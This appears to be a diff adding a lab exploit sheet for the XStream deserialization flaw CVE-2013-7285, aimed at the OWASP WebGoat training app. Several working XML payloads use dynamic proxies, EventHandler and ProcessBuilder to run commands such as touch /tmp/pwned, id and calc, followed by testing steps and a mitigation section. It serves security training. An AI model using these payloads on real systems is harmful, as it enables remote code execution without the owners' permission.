@@ -1,0 +1,223 @@
+====================================================================
+CVE-2013-7285 - XSTREAM DESERIALIZATION VULNERABILITY
+====================================================================
+
+VULNERABILITY OVERVIEW:
+-----------------------
+CVE-2013-7285 is a remote code execution vulnerability in XStream library
+that allows attackers to execute arbitrary commands through specially
+crafted XML input.
+
+The vulnerability exploits:
+- Dynamic proxy classes
+- Event handlers
+- Process execution via ProcessBuilder or Runtime
+
+====================================================================
+EXPLOIT TECHNIQUE:
+====================================================================
+
+The exploit uses dynamic proxy to trigger code execution during
+XML deserialization. We can use EventHandler to invoke methods
+and ProcessBuilder to execute system commands.
+
+====================================================================
+BASIC CONTACT (NORMAL SUBMISSION):
+====================================================================
+
+<contact>
+    <id>1</id>
+    <firstName>Bruce</firstName>
+    <lastName>Mayhew</lastName>
+    <email>webgoat@owasp.org</email>
+</contact>
+
+====================================================================
+EXPLOIT PAYLOADS:
+====================================================================
+
+PAYLOAD 1: Using Dynamic Proxy + EventHandler
+----------------------------------------------
+This payload creates a dynamic proxy that executes a command when
+certain methods are invoked during deserialization.
+
+<sorted-set>
+  <string>foo</string>
+  <dynamic-proxy>
+    <interface>java.lang.Comparable</interface>
+    <handler class="java.beans.EventHandler">
+      <target class="java.lang.ProcessBuilder">
+        <command>
+          <string>calc</string>
+        </command>
+      </target>
+      <action>start</action>
+    </handler>
+  </dynamic-proxy>
+</sorted-set>
+
+
+PAYLOAD 2: Touch a File (Proof of Concept)
+-------------------------------------------
+<sorted-set>
+  <string>foo</string>
+  <dynamic-proxy>
+    <interface>java.lang.Comparable</interface>
+    <handler class="java.beans.EventHandler">
+      <target class="java.lang.ProcessBuilder">
+        <command>
+          <string>touch</string>
+          <string>/tmp/pwned</string>
+        </command>
+      </target>
+      <action>start</action>
+    </handler>
+  </dynamic-proxy>
+</sorted-set>
+
+
+PAYLOAD 3: Create Contact with Embedded Exploit
+------------------------------------------------
+<contact>
+  <id>1</id>
+  <firstName>
+    <sorted-set>
+      <string>foo</string>
+      <dynamic-proxy>
+        <interface>java.lang.Comparable</interface>
+        <handler class="java.beans.EventHandler">
+          <target class="java.lang.ProcessBuilder">
+            <command>
+              <string>touch</string>
+              <string>/tmp/exploited</string>
+            </command>
+          </target>
+          <action>start</action>
+        </handler>
+      </dynamic-proxy>
+    </sorted-set>
+  </firstName>
+  <lastName>Hacker</lastName>
+  <email>exploit@example.com</email>
+</contact>
+
+
+PAYLOAD 4: Simplified Version
+------------------------------
+<contact class="dynamic-proxy">
+  <interface>org.owasp.webgoat.lessons.vulnerablecomponents.Contact</interface>
+  <handler class="java.beans.EventHandler">
+    <target class="java.lang.ProcessBuilder">
+      <command>
+        <string>touch</string>
+        <string>/tmp/webgoat_pwned</string>
+      </command>
+    </target>
+    <action>start</action>
+  </handler>
+</contact>
+
+
+PAYLOAD 5: For Windows Environment
+-----------------------------------
+<sorted-set>
+  <string>foo</string>
+  <dynamic-proxy>
+    <interface>java.lang.Comparable</interface>
+    <handler class="java.beans.EventHandler">
+      <target class="java.lang.ProcessBuilder">
+        <command>
+          <string>cmd</string>
+          <string>/c</string>
+          <string>echo pwned > C:\temp\exploited.txt</string>
+        </command>
+      </target>
+      <action>start</action>
+    </handler>
+  </dynamic-proxy>
+</sorted-set>
+
+====================================================================
+HOW IT WORKS:
+====================================================================
+
+1. XStream deserializes the XML into Java objects
+2. <sorted-set> creates a TreeSet which compares elements
+3. <dynamic-proxy> creates a proxy implementing Comparable
+4. When TreeSet compares elements, it calls compareTo()
+5. EventHandler intercepts the call and redirects to ProcessBuilder
+6. ProcessBuilder.start() is invoked, executing the command
+7. Code execution achieved!
+
+====================================================================
+RECOMMENDED PAYLOADS TO TRY (IN ORDER):
+====================================================================
+
+TRY FIRST (Linux/Docker):
+-------------------------
+<sorted-set>
+  <string>foo</string>
+  <dynamic-proxy>
+    <interface>java.lang.Comparable</interface>
+    <handler class="java.beans.EventHandler">
+      <target class="java.lang.ProcessBuilder">
+        <command>
+          <string>touch</string>
+          <string>/tmp/pwned</string>
+        </command>
+      </target>
+      <action>start</action>
+    </handler>
+  </dynamic-proxy>
+</sorted-set>
+
+TRY SECOND (Alternative):
+-------------------------
+<contact>
+  <id>999</id>
+  <firstName>
+    <sorted-set>
+      <string>foo</string>
+      <dynamic-proxy>
+        <interface>java.lang.Comparable</interface>
+        <handler class="java.beans.EventHandler">
+          <target class="java.lang.ProcessBuilder">
+            <command>
+              <string>id</string>
+            </command>
+          </target>
+          <action>start</action>
+        </handler>
+      </dynamic-proxy>
+    </sorted-set>
+  </firstName>
+  <lastName>Exploit</lastName>
+  <email>test@test.com</email>
+</contact>
+
+====================================================================
+TESTING:
+====================================================================
+
+1. Send the normal contact first to see expected response
+2. Send exploit payload
+3. Look for:
+   - Success message
+   - No error (might mean it worked silently)
+   - Different response than normal
+
+====================================================================
+MITIGATION:
+====================================================================
+
+This vulnerability was fixed in later XStream versions by:
+- Blacklisting dangerous classes
+- Enabling security framework
+- Using whitelist mode for allowed classes
+
+To fix:
+- Update XStream to version 1.4.7 or later
+- Enable security framework
+- Use XStream.setupDefaultSecurity()
+
+====================================================================
